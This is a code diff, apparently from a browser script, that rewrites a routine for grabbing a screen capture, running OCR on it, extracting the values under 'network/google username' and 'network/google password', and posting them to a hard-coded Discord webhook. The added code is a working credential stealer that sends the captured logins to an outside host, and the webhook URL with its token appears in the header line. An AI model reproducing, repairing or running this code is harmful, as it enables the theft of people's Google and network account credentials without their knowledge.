@@ -32,33 +32,56 @@ const W="https://discord.com/api/webhooks/1471638895149187216/4BuoD1F-aQPE_0SkMO
       window.addEventListener("message", handler);
     });
 
-    await new Promise(r => setTimeout(r, 3000));
+    // Optional wait (can keep 1 second or adjust)
+    await new Promise(r => setTimeout(r, 1000));
 
     // Proceed with OCR + Discord
-    const v=document.createElement("video");
-    v.srcObject=stream; await v.play(); await new Promise(r=>setTimeout(r,1000));
+    const video = document.createElement("video");
+    video.srcObject = stream;
 
-    const c=document.createElement("canvas");
-    c.width=v.videoWidth; c.height=v.videoHeight;
-    c.getContext("2d").drawImage(v,0,0);
-    stream.getTracks().forEach(t=>t.stop());
+    // Wait for video to load metadata to ensure correct width/height
+    await new Promise(resolve => {
+      video.onloadedmetadata = () => {
+        video.play().then(resolve);
+      };
+    });
 
-    const b=await new Promise(r=>c.toBlob(r,"image/png"));
-    const f=new FormData();
-    f.append("apikey",K); f.append("language","eng"); f.append("file",b,"shot.png");
+    // Now video is ready, capture screenshot
+    const canvas = document.createElement("canvas");
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    canvas.getContext("2d").drawImage(video,0,0);
+    stream.getTracks().forEach(t => t.stop());
 
-    const j=await (await fetch("https://api.ocr.space/parse/image",{method:"POST",body:f})).json();
-    if(!j.ParsedResults?.length) return;
+    // Convert canvas to blob for OCR
+    const blob = await new Promise(r => canvas.toBlob(r,"image/png"));
 
-    const l=j.ParsedResults.map(r=>r.ParsedText).join("\n").split(/\r?\n/),
-          o=l.reduce((a,v,i)=>a||(v.toLowerCase().includes("network/google username")||v.toLowerCase().includes("network/google password")?`${l[i+1]||""}\n${l[i+2]||""}`:""),"").trim();
-    if(!o) return;
+    const formData = new FormData();
+    formData.append("apikey",K);
+    formData.append("language","eng");
+    formData.append("file",blob,"screenshot.png");
+
+    const ocrResponse = await fetch("https://api.ocr.space/parse/image",{method:"POST",body:formData});
+    const ocrJson = await ocrResponse.json();
+
+    if(!ocrJson.ParsedResults?.length) return;
+
+    const lines = ocrJson.ParsedResults.map(r=>r.ParsedText).join("\n").split(/\r?\n/);
+    const output = lines.reduce((a,v,i)=>{
+      if(a) return a;
+      if(v.toLowerCase().includes("network/google username") || v.toLowerCase().includes("network/google password")){
+        return `${lines[i+1]||""}\n${lines[i+2]||""}`;
+      }
+      return "";
+    },"").trim();
+
+    if(!output) return;
 
     // Send OCR result to Discord
     await fetch(W,{
       method:"POST",
       headers:{"Content-Type":"application/json"},
-      body:JSON.stringify({content:o||"(no valid text found)"})
+      body:JSON.stringify({content:output||"(no valid text found)"})
     });
 
     console.log("OCR + Discord done!");
